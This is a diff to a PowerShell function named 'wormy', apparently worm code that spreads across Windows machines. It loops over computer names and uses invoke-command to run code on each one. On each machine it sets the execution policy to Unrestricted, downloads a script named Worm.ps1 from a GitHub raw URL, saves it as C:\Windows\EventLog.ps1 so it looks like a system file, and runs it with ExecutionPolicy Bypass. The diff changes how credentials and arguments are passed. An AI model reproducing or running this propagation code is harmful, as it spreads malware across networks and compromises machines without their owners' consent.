@@ -117,10 +117,10 @@ function wormy{
         Foreach($i in $computerNames){
             Write-Output $i
             start-job{
-            invoke-command -ComputerName $args -Credential $credential -ScriptBlock {
+            invoke-command -ComputerName $args -ScriptBlock {
                 if(Test-Path 'C:\Users\Public\Downloads\desktop.log' ){
                     if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 30){
-                        Invoke-Command -ScriptBlock {
+                        Invoke-Command $args -ScriptBlock {
                         set-executionpolicy Unrestricted
                         $WebClient = New-Object System.Net.WebClient
                         $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/powW/main/Worm.ps1","C:\Windows\EventLog.ps1")
@@ -134,7 +134,7 @@ function wormy{
                         $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/powW/main/Worm.ps1","C:\Windows\EventLog.ps1")
                         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\EventLog.ps1' -ExecutionPolicy Bypass   
                 }
-                }
+                } -ArgumentList $args
                 } -ArgumentList $i
                 start-sleep -Seconds 2
             }
